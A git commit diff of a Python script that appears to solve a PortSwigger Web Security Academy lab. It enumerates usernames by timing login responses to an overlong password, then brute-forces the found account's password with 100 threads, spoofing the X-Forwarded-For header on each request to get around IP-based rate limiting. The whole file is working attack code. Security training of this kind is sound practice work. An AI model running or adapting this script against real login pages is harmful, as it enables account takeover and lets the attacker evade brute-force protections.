572622113b28567ee5af54e6b10649b710ce7c41
PhucBonTu <82533607+phucdc-noob@users.noreply.github.com>
2021-11-10 17:02:52 +0700

    nah

--- Authentication/enum_time.py
+++ Authentication/enum_time.py
@@ -1,36 +1,41 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
 
-url = 'https://ac511f2b1fc9020bc08c232600c80099.web-security-academy.net/login'
+url = 'https://acfa1fe71f79d8fbc0a926240026009a.web-security-academy.net/login'
 delay = {}
 
 def get_username(data, headers):
-    delay[str(data['username']).strip()] = requests.post(url, data = data, headers = headers).elapsed.microseconds
-    print(data['username'], '\n')
+    return (data['username'], requests.post(url, data = data, headers = headers).elapsed.microseconds)
 
 def get_password(data, headers):
-    return ('Log out' in requests.post(url, data = data, headers = headers).text)
+    return (data['password'], 'Log out' in requests.post(url, data = data, headers = headers).text)
 
 with ThreadPoolExecutor(max_workers=100) as pool:
     usernames = open('username.txt', 'r').readlines()
     passwords = open('password.txt', 'r').readlines()
-    id = 99999
+
+    id = 700
     data = []
     headers = []
+    
     for user in usernames:
         id += 1
-        data.append({'username' : user.strip(), 'password' : 'peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter'})
+        data.append({'username' : user.strip(), 'password' : 'peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter'})
         headers.append({'X-Forwarded-For' : str(id)})
-    pool.map(get_username, data, headers)
+    
+    delay = dict(list(pool.map(get_username, data, headers)))
+    
     username = str(max(delay, key=delay.get))
     print(username)
+    
     data = []
     headers = []
+    
     for passwd in passwords:
         id += 1
         data.append({'username' : username.strip(), 'password' : passwd.strip()})
         headers.append({'X-Forwarded-For' : str(id)})
         
-    result = list(pool.map(get_password, data, headers))
-    password = passwords[result.index(True)].strip()
+    result = dict(list(pool.map(get_password, data, headers)))
+    password = list(result.keys())[list(result.values()).index(True)]
     print(password)
